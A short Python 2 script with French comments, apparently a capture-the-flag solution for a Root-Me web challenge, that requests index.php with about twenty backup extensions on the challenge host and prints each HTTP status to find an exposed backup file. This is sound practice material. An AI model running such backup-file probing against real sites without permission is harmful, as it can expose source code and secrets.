#On spécifie que l'on souhaite utiliser le package urllib2
import urllib2
 
#On établit une liste d'extensions correspondants à des fichiers de backup
list=[".backup",".bck",".old",".save",".bak",".sav","~",".copy",".old",".orig",".tmp",".txt",".back",".bkp",".bac",".tar",".gz",".tar.gz",".zip",".rar"]
 
#On souhaite trouver les backups du fichier 'index'
fichier ="index"
 
#On spécifie notre hote en dur
hote = "http://challenge01.root-me.org/web-serveur/ch11/"
 
#On parcours chaque extension possible
for item in list:
 
   try:
        #On construit la chaine 'url' qui correspond à l'url du ficher + extension à tester
        url = hote + "" + fichier + "" + ".php" + item
        #On établit une connexion
        result=urllib2.urlopen(url)
        print url + " Code : "+str(result.getcode())
 
   #Permet de gérer les erreurs 404 lors de la connexion
   except urllib2.HTTPError as e:
        if e.code == 404:
            print url+" Code :  " + str(e)
        else:
            print url+" Code :  " + str(e)